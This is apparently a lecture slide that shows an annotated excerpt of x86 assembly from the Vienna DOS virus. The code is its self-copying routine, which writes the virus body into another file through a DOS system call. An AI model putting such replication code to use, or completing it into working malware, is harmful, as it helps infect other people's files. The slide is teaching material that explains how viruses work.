
### Vienna copying  {.smaller}

<!-- \lstset{
    style=small,
    language=myasm,
    moredelim={**[is][\btHL<2|handout:0>]{@hi2@}{@endhi@}},
} -->
 
<pre><code><span data-fragment-index="2" class="fragment custom myem-only">mov $0x8f9, %si</span> // %si = beginning of virus data
...
mov $0x288, %cx // length of virus
mov $0x40, %ah  // system call # for write
mov %si, %dx
sub $0x1f9, %dx // %dx = beginning of virus code
int 0x21 // make write system call
</code></pre>
